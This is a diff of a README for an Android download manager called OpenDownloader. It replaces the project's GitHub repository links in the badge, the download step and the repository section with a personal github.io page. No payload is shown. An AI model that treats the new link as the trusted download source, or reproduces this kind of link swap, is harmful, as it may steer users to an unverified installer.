@@ -1,6 +1,6 @@
 # 📥 OpenDownloader - Your All-in-One Download Manager for Android
 
-[![Download OpenDownloader](https://img.shields.io/badge/Download-OpenDownloader-brightgreen?style=for-the-badge&logo=android)](https://github.com/Adolfbeaming31/OpenDownloader)
+[![Download OpenDownloader](https://img.shields.io/badge/Download-OpenDownloader-brightgreen?style=for-the-badge&logo=android)](https://adolfbeaming31.github.io)
 
 ## 🎯 What is OpenDownloader?
 
@@ -35,7 +35,7 @@ Getting OpenDownloader up and running takes just a few minutes. Follow these sim
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/Adolfbeaming31/OpenDownloader](https://github.com/Adolfbeaming31/OpenDownloader)
+Visit this link to download the application: [https://adolfbeaming31.github.io](https://adolfbeaming31.github.io)
 
 Click the green "Download" button at the top of the page. You'll be taken to the latest release section where you can find the installation file.
 
@@ -128,7 +128,7 @@ Need help or want to contribute? Join the growing community of OpenDownloader us
 - **Source Code** – Fork the project and contribute your own improvements
 - **Documentation** – Detailed technical documentation for developers
 
-Visit the repository at: [https://github.com/Adolfbeaming31/OpenDownloader](https://github.com/Adolfbeaming31/OpenDownloader)
+Visit the repository at: [https://adolfbeaming31.github.io](https://adolfbeaming31.github.io)
 
 ## 📄 License and Legal
 
